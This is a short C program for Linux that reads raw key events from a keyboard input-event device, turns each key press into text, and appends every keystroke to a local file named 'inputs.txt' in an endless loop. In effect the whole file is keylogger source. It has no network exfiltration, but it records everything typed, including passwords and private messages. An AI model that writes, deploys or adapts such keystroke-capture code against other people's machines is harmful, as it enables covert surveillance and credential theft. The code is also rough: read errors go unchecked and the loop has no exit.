#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include "local_events.h"




int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <keyboard-event-file>\n", argv[0]);
        return EXIT_FAILURE;
    }

    FILE *dest_file = fopen("inputs.txt", "w");
    if(dest_file == NULL) {
        perror("ERROR OPEING FILE ");
        return EXIT_FAILURE;
    }


    const char *filename = argv[1];
    int fp = open(filename, O_RDONLY );

    if(fp < 0) {
        printf("Failed to open file discriptor : %s \n", filename);
        perror("ERROR: ");
        return EXIT_FAILURE;
    }

    struct input_event ev ;
    int running = true;
    while (running) {
        read(fp, &ev, sizeof ev);
        if(ev.type != EV_KEY) {
            continue;
        }
        if(ev.value !=1 ) continue;
        char code[20] = {0};
        get_keyboard_codes(&ev, code);
        printf("keyboard parsed %s\n", code);
        // fputs("hello ", dest_file);
        fputs(code, dest_file);
        fflush(dest_file);

        printf("Event: time %ld.%06ld, type %d, code %d, value %d\n",
               ev.time.tv_sec, ev.time.tv_usec, ev.type, ev.code, ev.value);
    }

    close(fp);
    fclose(dest_file);




    return EXIT_SUCCESS;
}